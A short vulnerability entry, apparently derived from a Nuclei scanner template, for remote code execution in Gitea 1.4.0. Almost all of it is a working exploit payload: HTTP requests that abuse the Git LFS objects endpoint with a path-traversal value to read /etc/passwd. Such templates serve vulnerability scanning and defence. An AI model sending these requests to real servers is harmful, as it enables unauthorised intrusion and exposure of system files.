# Vulnerability: Gitea 1.4.0 - Remote Code Execution
**Classification:** GITEA
**Source:** Nuclei Template (`gitea-rce.yaml`)

## Description
Gitea 1.4.0 is vulnerable to remote code execution.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /api/v1/repos/search?limit=1 HTTP/1.1
Host: {{Hostname}}

POST /{{repo}}.git/info/lfs/objects HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Accept: application/vnd.git-lfs+json

{
    "Oid": "....../../../etc/passwd",
    "Size": 1000000,
    "User" : "{{randstr}}",
    "Password" : "{{randstr}}",
    "Repo" : "{{randstr}}",
    "Authorization" : "{{randstr}}"
}

GET /{{repo}}.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth HTTP/1.1
Host: {{Hostname}}
```

